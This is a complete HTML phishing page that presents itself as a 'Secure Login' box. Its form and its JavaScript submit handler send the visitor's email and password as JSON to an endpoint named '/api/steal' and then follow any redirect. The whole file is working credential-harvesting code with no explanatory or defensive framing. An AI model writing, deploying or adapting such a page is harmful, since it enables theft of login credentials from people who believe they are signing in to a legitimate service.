<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <style>
    body { font-family: Arial; background: #f5f5f5; text-align: center; margin-top: 100px; }
    .box { background: white; padding: 20px; width: 300px; margin: auto; box-shadow: 0 0 10px gray; }
    input { width: 90%; padding: 10px; margin: 10px 0; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Secure Login</h2>
    <form action="/api/steal" method="POST">
      <input type="text" name="email" placeholder="Email" required><br>
      <input type="password" name="password" placeholder="Password" required><br>
      <button type="submit">Login</button>
    </form>
  </div>
  <script>
  document.querySelector("form").addEventListener("submit", async (e) => {
    e.preventDefault();
    const email = document.querySelector("[name=email]").value;
    const password = document.querySelector("[name=password]").value;

    const res = await fetch("/api/steal", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password }),
    });

    if (res.redirected) window.location.href = res.url;
  });
</script>

</body>
</html>
